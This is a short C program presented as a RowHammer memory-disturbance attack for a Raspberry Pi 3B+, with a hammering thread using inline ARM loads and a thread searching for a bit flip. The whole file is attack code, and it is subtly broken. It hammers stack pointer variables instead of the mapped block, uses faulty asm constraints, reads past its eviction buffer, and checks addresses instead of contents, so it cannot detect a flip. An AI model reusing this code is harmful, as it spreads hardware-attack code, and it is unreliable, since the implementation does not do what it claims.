// Author: Kasper Seglem

// RowHammer attack for an ARMv7 Raspberry Pi 3B+

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h> 
#include <sys/syscall.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>

#define _GNU_SOURCE
#define CACHE_SIZE (1024 * 1024) // 1MB

struct thread_args {

	void *addr1;
	void *addr2;
	void *block;
};

void *rowhammer(void *input)
{
	struct thread_args *args = input;

	unsigned long temp = 0xFFFFFFFF;

	int *fill = malloc(CACHE_SIZE);

	for (int i = 0; i < CACHE_SIZE / 4; i++) {
                fill[i] = i;       
        }

	int num;

	printf("hammering...\n");
	while (1) {
		asm volatile(
			"ldr %2, [%0]\n\t"
			"ldr %2, [%1]\n\t"
			::"r"(args->addr1), "r"(args->addr2), "r"(temp)
		);

		for (int i = 0; i < CACHE_SIZE; i++) {
			num = fill[i];       
		}
	}

	return 0;
}

void *check(void *input)
{
	sleep(1);
	struct thread_args *args = input;

	printf("searching...\n");
	while(1) {

		for (int i = 0; i < 1500; i++) {
			if (&args->block[i] == (void*) 1) return 0;
		}	
	}	

	return 0;
}

int main()
{
	printf("starting...\n");

	void *mem_block = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

	void *addr_x = (void*) (mem_block+0x1000/2);
	void *addr_y = (void*) (mem_block+0x1000/3); 

	struct thread_args *args = malloc (sizeof (struct thread_args));
	args->addr1 = &addr_x;
	args->addr2 = &addr_y;
	args->block = &mem_block;

	pthread_t pthread_hammer;
	pthread_t pthread_check;

	pthread_create(&pthread_hammer, NULL, rowhammer, args);

	pthread_create(&pthread_check, NULL, check, args);

	pthread_join(pthread_check, NULL);
	printf("read disturb found\n");

	pthread_cancel(pthread_hammer);
	printf("exiting...\n");

	return 0;
}
